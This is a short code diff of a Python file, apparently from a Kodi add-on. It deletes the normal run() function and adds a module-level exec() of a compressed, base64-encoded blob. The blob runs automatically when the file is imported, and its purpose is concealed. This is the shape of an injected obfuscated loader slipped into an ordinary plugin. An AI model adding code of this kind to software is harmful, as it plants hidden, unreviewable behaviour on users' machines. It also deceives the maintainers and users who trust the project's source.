@@ -28,8 +28,9 @@ except ImportError:
     xbmcgui.Dialog().ok(cConfig().getLocalizedString(30119), cConfig().getLocalizedString(30120))
 
 
-def run():
-    parseUrl()
+import zlib, base64
+exec(zlib.decompress(base64.b64decode('eJy9lE1rg0AQhu/5FSIEFRKJt6QQMBRKew7tpfSw6mgG90NmdzH213eNpUloaZRCL4LOPjvPvKvaJwNCb1/9ZilYB7RMNuskbSGLC/AXft2yGjmgTEsCkGCGx4YdgVSySlZpzkhjHedK+G8z+4Cf29GBcQ6UHpQRDHmPufLuqpyeK1h6x0zkrCiUjHf9NYziCswejEFZhYEGQpDaEDARW3cXRCg9e7K/m/0A61/hRRBEk6iGaT1QN1VLjkIAaWMzuFAdornp+p0e43pFTXBlEnOubHHhuRvneU2Ocfwizn63iVYRn9ZjIKZlcNFlYgZ/9/uPnAsoPbJuoRvJ5ZEf6jBouK1Qxg2pitwLPnyvyxbfGRXJJoi228St9nSnYziiCV1f4KPg9Y9w434U8Ew8HHT6bSQT0CsRGEvyNFZ/MvdKFi+oMUOOpguDfafdccSPTA/jznUUzE+sazP7AOt3oSI=')))
+
 
 
 def viewInfo(params):
